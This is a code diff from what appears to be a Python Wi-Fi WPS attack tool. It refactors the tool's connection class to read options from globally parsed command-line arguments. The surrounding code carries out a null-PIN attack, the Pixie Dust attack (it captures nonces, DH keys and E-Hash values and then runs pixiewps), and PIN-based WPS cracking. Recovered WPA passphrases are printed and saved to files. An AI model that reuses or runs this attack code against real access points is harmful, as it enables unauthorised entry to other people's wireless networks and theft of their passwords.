@@ -24,8 +24,11 @@ import src.wps.pixiewps
 import src.wps.generator
 import src.utils
 import src.wifi.collector
+import src.args
 
 from src import logger
+
+args = src.args.parseArgs()
 
 class ConnectionStatus:
     """Stores WPS connection details and status."""
@@ -49,11 +52,8 @@ class ConnectionStatus:
 class Initialize:
     """WPS connection"""
 
-    def __init__(self, interface: str, write_result: bool = False, save_result: bool = False, print_debug: bool = False):
+    def __init__(self, interface: str):
         self.INTERFACE    = interface
-        self.WRITE_RESULT = write_result
-        self.SAVE_RESULT  = save_result
-        self.PRINT_DEBUG  = print_debug
 
         self.CONNECTION_STATUS = ConnectionStatus()
         self.PIXIE_CREDS  = src.wps.pixiewps.Data()
@@ -98,8 +98,7 @@ class Initialize:
         logger.success(f'WPA PSK: \'{wpa_psk}\'')
         logger.success(f'AP SSID: \'{essid}\'')
 
-    def singleConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False, showpixiecmd: bool = False,
-                         pixieforce: bool = False, pbc_mode: bool = False, store_pin_on_fail: bool = False, null_pin: bool = False) -> bool:
+    def singleConnection(self, bssid: str = None, pin: str = None, pbc_mode: bool = False, store_pin_on_fail: bool = False) -> bool:
         """        
         Establish a WPS connection, using a pin, a calculated pin (if in pixiemode), a PIN
         generated from a list of likely PINs, PBC mode, or null pin. handles pixiedust
@@ -111,10 +110,10 @@ class Initialize:
         collector    = src.wifi.collector.WiFiCollector()
 
         # Handle null pin attack
-        if null_pin:
+        if args.null_pin:
             pin = '00000000'
         elif pin is None:
-            if pixiemode:
+            if args.pixie_dust:
                 try:
                     filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
 
@@ -136,19 +135,19 @@ class Initialize:
             pin = '<PBC mode>'
         elif store_pin_on_fail:
             try:
-                self._wpsConnection(bssid, pin, pixiemode)
+                self._wpsConnection(bssid, pin)
             except KeyboardInterrupt:
                 logger.info('Aborting…')
                 collector.writePin(bssid, pin)
                 return False
         else:
-            self._wpsConnection(bssid, pin, pixiemode)
+            self._wpsConnection(bssid, pin)
 
         if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
             self._credentialPrint(pin, self.CONNECTION_STATUS.WPA_PSK, self.CONNECTION_STATUS.ESSID)
-            if self.WRITE_RESULT:
+            if args.write:
                 collector.writeResult(bssid, self.CONNECTION_STATUS.ESSID, pin, self.CONNECTION_STATUS.WPA_PSK)
-            if self.SAVE_RESULT:
+            if args.save:
                 collector.addNetwork(bssid, self.CONNECTION_STATUS.ESSID, self.CONNECTION_STATUS.WPA_PSK)
             if not pbc_mode:
                 # Try to remove temporary PIN file
@@ -158,11 +157,11 @@ class Initialize:
                 except FileNotFoundError:
                     pass
             return True
-        if pixiemode:
+        if args.pixie_dust:
             if self.PIXIE_CREDS.getAll():
-                pin = self.PIXIE_CREDS.runPixieWps(showpixiecmd, pixieforce)
+                pin = self.PIXIE_CREDS.runPixieWps(args.show_pixie_cmd, args.pixie_force)
                 if pin:
-                    return self.singleConnection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
+                    return self.singleConnection(bssid, pin, store_pin_on_fail=True)
                 return False
 
             logger.error('Not enough data to run Pixie Dust attack')
@@ -220,30 +219,28 @@ class Initialize:
 
         self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
 
-    def _handleWpas(self, pixiemode: bool = False, pbc_mode: bool = False, verbose: bool = None) -> bool:
+    def _handleWpas(self, pbc_mode: bool = False) -> bool:
         """Handles WPA supplicant output and updates connection status"""
 
         line = self.WPAS.stdout.readline()
 
-        if not verbose:
-            verbose = self.PRINT_DEBUG
         if not line:
             self.WPAS.wait()
             return False
 
         line = line.rstrip('\n')
 
-        if verbose:
-            sys.stderr.write(line + '\n')
+        if args.verbose:
+            print(line)
 
         # Handle WPS protocol messages
         if line.startswith('WPS: '):
-            return self._handle_wps_messages(line, pixiemode)
+            return self._handle_wps_messages(line)
 
         # Handle connection state changes
         return self._handle_connection_states(line, pbc_mode)
 
-    def _handle_wps_messages(self, line: str, pixiemode: bool) -> bool:
+    def _handle_wps_messages(self, line: str) -> bool:
         """Handle WPS-specific protocol messages"""
 
         if 'M2D' in line:
@@ -274,25 +271,25 @@ class Initialize:
             logger.error('Error: wrong PIN code')
 
         elif 'Enrollee Nonce' in line and 'hexdump' in line:
-            self._handle_pixie_data('E_NONCE', line, 16 * 2, pixiemode)
+            self._handle_pixie_data('E_NONCE', line, 16 * 2)
 
         elif 'Registrar Nonce' in line and 'hexdump' in line:
-            self._handle_pixie_data('R_NONCE', line, 16 * 2, pixiemode)
+            self._handle_pixie_data('R_NONCE', line, 16 * 2)
 
         elif 'DH own Public Key' in line and 'hexdump' in line:
-            self._handle_pixie_data('PKR', line, 192 * 2, pixiemode)
+            self._handle_pixie_data('PKR', line, 192 * 2)
 
         elif 'DH peer Public Key' in line and 'hexdump' in line:
-            self._handle_pixie_data('PKE', line, 192 * 2, pixiemode)
+            self._handle_pixie_data('PKE', line, 192 * 2)
 
         elif 'AuthKey' in line and 'hexdump' in line:
-            self._handle_pixie_data('AUTHKEY', line, 32 * 2, pixiemode)
+            self._handle_pixie_data('AUTHKEY', line, 32 * 2)
 
         elif 'E-Hash1' in line and 'hexdump' in line:
-            self._handle_pixie_data('E_HASH1', line, 32 * 2, pixiemode)
+            self._handle_pixie_data('E_HASH1', line, 32 * 2)
 
         elif 'E-Hash2' in line and 'hexdump' in line:
-            self._handle_pixie_data('E_HASH2', line, 32 * 2, pixiemode)
+            self._handle_pixie_data('E_HASH2', line, 32 * 2)
 
         elif 'Network Key' in line and 'hexdump' in line:
             self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
@@ -360,12 +357,13 @@ class Initialize:
 
         return True
 
-    def _handle_pixie_data(self, attr: str, line: str, expected_len: int, pixiemode: bool):
+    def _handle_pixie_data(self, attr: str, line: str, expected_len: int):
         """Handle pixie dust attack related data"""
         hex_value = self._getHex(line)
         setattr(self.PIXIE_CREDS, attr, hex_value)
         assert len(hex_value) == expected_len
-        if pixiemode:
+
+        if args.pixie_dust:
             logger.debug(f'{attr}: {hex_value}')
 
     def _decode_essid(self, line: str) -> str:
@@ -375,8 +373,8 @@ class Initialize:
             'unicode-escape'
         ).encode('latin1').decode('utf-8', errors='replace')
 
-    def _wpsConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False,
-                       pbc_mode: bool = False, verbose: bool = None) -> bool:
+    def _wpsConnection(self, bssid: str = None, pin: str = None,
+                       pbc_mode: bool = False) -> bool:
         """Handles WPS connection process"""
 
         self.PIXIE_CREDS.clear()
@@ -384,9 +382,6 @@ class Initialize:
         self.WPAS.stdout.read(300) # Clean the pipe
 
         wps_start_time = time.time()
-
-        if not verbose:
-            verbose = self.PRINT_DEBUG
 
         if pbc_mode:
             if bssid:
@@ -410,7 +405,7 @@ class Initialize:
             return False
 
         while True:
-            res = self._handleWpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
+            res = self._handleWpas(pbc_mode=pbc_mode)
 
             if not res or self.CONNECTION_STATUS.STATUS in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                 break
